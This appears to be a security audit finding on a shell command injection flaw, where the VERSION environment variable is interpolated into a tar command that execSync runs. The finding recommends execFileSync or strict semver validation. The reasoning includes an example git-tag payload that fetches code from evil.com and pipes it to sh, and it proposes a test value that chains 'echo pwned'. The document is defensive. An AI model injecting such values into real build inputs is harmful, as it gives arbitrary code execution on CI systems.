title: Shell command injection via VERSION env var in tar invocation
reasoning: The VERSION environment variable (line 33) is interpolated into tarballName (line 62) which is then passed to execSync as a shell string (line 66). execSync spawns a shell, so any shell metacharacters in VERSION (semicolons, backticks, $(), pipes) will be interpreted. In CI, VERSION is typically derived from a git tag (per the comment on lines 31-32). A malicious or compromised git tag like v1.0.0$(curl evil.com/x|sh) would achieve arbitrary command execution during the build. The platform/arch values on line 37 are safe (Node.js constants), but version is externally influenced.
recommendation: Replace execSync string interpolation with execFileSync('tar', ['-czf', tarballName, '-C', stageDir, 'dist', 'lib'], { cwd: repoRoot, stdio: 'inherit' }) to avoid shell interpretation. Alternatively, validate VERSION against a strict semver regex before use.
whyTestsDoNotAlreadyCoverThis: No tests are included for this feature, and build scripts are typically not unit-tested. The injection requires a crafted VERSION value that would not appear in normal CI runs.
suggestedRegressionTest: Add a unit test or integration check that calls the tar logic with VERSION containing shell metacharacters (e.g., '1.0.0;echo pwned') and asserts no extra file is created / the command fails safely.
minimumFixScope: Replace execSync on line 65-68 with execFileSync using an argument array, eliminating the shell entirely.
